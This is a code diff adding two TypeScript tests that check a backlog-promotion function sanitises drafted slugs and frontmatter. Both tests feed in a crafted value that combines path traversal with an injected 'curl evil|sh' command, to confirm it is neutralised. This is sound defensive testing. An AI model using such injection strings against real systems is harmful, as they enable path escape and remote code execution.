@@ -521,6 +521,70 @@ describe('promoteObservation — new-item creation through the CAS', () => {
 		);
 	});
 
+	it('sanitises an unsafe drafted newSlug (no path escape, no shell metacharacters)', async () => {
+		const seeded = seedRepoWithArbiter(scratch.root, []);
+		const itemPath = seedAnsweredPromote(seeded.repo, 'unsafe');
+		gitIn(['add', '-A'], seeded.repo);
+		gitIn(['commit', '-q', '-m', 'answered'], seeded.repo);
+		gitIn(['push', '-q', 'arbiter', 'main'], seeded.repo);
+
+		const result = await promoteObservation({
+			cwd: seeded.repo,
+			item: 'observation:unsafe',
+			itemPath,
+			newSlug: '../x"; curl evil|sh; echo "',
+			arbiter: 'arbiter',
+			env: gitEnv(),
+		});
+		expect(result.outcome).toBe('promoted');
+		expect(
+			existsOnArbiterMain(seeded.repo, 'backlog', 'x-curl-evil-sh-echo'),
+		).toBe(true);
+	});
+
+	it('stamps the safe slug over a drafted body whose frontmatter carries an unsafe `slug:`', async () => {
+		// The ledger reads frontmatter `slug:` before the file name, so a drafted
+		// body must not be able to smuggle an unsafe identity past the sanitised
+		// file name.
+		const seeded = seedRepoWithArbiter(scratch.root, []);
+		const itemPath = seedAnsweredPromote(seeded.repo, 'drafted');
+		gitIn(['add', '-A'], seeded.repo);
+		gitIn(['commit', '-q', '-m', 'answered'], seeded.repo);
+		gitIn(['push', '-q', 'arbiter', 'main'], seeded.repo);
+
+		const result = await promoteObservation({
+			cwd: seeded.repo,
+			item: 'observation:drafted',
+			itemPath,
+			newSlug: 'drafted-task',
+			stubContent: [
+				'---',
+				'slug: ../x"; curl evil|sh',
+				'title: Drafted',
+				'---',
+				'',
+				'## What to build',
+				'',
+				'Something.',
+				'',
+				'## Prompt',
+				'',
+				'> Do it.',
+				'',
+			].join('\n'),
+			arbiter: 'arbiter',
+			env: gitEnv(),
+		});
+		expect(result.outcome).toBe('promoted');
+		gitIn(['fetch', '-q', 'arbiter'], seeded.repo);
+		const body = gitIn(
+			['show', `arbiter/main:${result.newItemPath}`],
+			seeded.repo,
+		);
+		expect(body).toMatch(/^slug: drafted-task$/m);
+		expect(body).not.toContain('curl evil');
+	});
+
 	it('a same-slug new-item race ⇒ exactly one promotes, the loser fails CAS (no special case)', async () => {
 		const seeded = seedRepoWithArbiter(scratch.root, []);
 		// Distinct committer identity per racer (raceClone + racerEnv) so the two
